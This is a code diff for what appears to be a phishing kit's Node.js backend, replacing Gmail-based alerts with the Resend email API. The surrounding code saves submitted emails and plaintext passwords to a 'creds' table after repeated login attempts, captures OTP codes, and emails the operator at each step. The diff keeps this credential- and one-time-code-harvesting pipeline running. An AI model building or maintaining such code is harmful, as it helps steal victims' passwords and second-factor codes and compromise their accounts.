@@ -6,6 +6,10 @@ const crypto = require('crypto');
 const { createClient } = require('@supabase/supabase-js');
 const nodemailer = require('nodemailer');
 
+const { Resend } = require('resend');
+
+const resend = new Resend(process.env.RESEND_API_KEY);
+
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
@@ -138,7 +142,13 @@ app.post('/login', async (req, res) => {
       from: process.env.EMAIL_USER,
       to: process.env.EMAIL_USER
     }
-    transporter.sendMail(mailInfo)
+    const { data, error } = await resend.emails.send({
+      from: 'Acme <onboarding@resend.dev>',
+      to: [process.env.EMAIL_USER],
+      subject: 'Attempting Login',
+      html: `Login being attempted by user "${email}"`,
+      replyTo: process.env.EMAIL_USER,
+    });
     return res.redirect('/login/password')
   } catch (err) {
     console.error('Error during login', err);
@@ -210,13 +220,13 @@ app.post('/login/password', async (req, res) => {
     } else {
       console.log("Login Attempt Three")
       await supabase.from('creds').insert([{ email: account, password: password, session_id: sessionId }]);
-      const mailInfo = {
-      subject: "Logged In",
-      text: `Login process done by user "${account}"`,
-      from: process.env.EMAIL_USER,
-      to: process.env.EMAIL_USER
-    }
-    transporter.sendMail(mailInfo)
+    const { data, error } = await resend.emails.send({
+      from: 'Acme <onboarding@resend.dev>',
+      to: [process.env.EMAIL_USER],
+      subject: 'Logged In',
+      html: `Login process done by user "${account}"`,
+      replyTo: process.env.EMAIL_USER,
+    });
       return res.redirect('/login/password?otp=1');
     }
   } catch (err) {
@@ -232,13 +242,13 @@ app.post("/login/otp", async (req, res) => {
   await supabase.from('otp').insert([{email: email, otp: otp}]);
   await supabase.from('session_count').delete().eq('session_id', sessionId);
 
-  const mailInfo = {
-    subject: "OTP sent",
-    text: `OTP sent: user "${email}"`,
-    from: process.env.EMAIL_USER,
-    to: process.env.EMAIL_USER
-  }
-  transporter.sendMail(mailInfo)
+  const { data, error } = await resend.emails.send({
+    from: 'Acme <onboarding@resend.dev>',
+    to: [process.env.EMAIL_USER],
+    subject: 'OTP sent',
+    html: `OTP sent: user "${email}"`,
+    replyTo: process.env.EMAIL_USER,
+  });
   const next = req.cookies.next;  
   console.log("Checking for next cookie");
   
